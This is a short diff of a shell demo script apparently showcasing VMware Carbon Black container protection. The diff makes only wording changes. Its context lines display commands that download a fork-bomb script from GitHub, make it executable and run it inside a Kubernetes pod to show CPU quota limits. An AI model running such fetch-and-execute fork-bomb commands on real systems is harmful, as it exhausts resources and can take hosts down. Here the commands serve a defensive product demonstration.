@@ -74,7 +74,7 @@ echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect:"
 echo -e " - K8s onprem"
 echo -e " - K8s in public cloud, for example Amazon, Azure, or Google..."
 echo -e " - minikube"
-echo -e " - microk8s"
+echo -e " - microK8s"
 echo -e " - and of course VMware Tanzu."
 
 if test -z "$intro" 
@@ -194,7 +194,7 @@ echo -e "Let's open a shell in the pod, and try to download a malware"
 echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
 echo -e "${RED}chmod +x fork-bomb.sh${NC}"
 echo -e "${RED}./fork-bomb.sh${NC}"
-echo -e "Luckily we have a ${GREEN}CPU quota${NC}"
+echo -e "It's a fork bomb, but luckily we have a ${GREEN}CPU quota${NC}"
 pe "kubectl exec -it ${firstpod} -- /bin/bash"
 wait
 
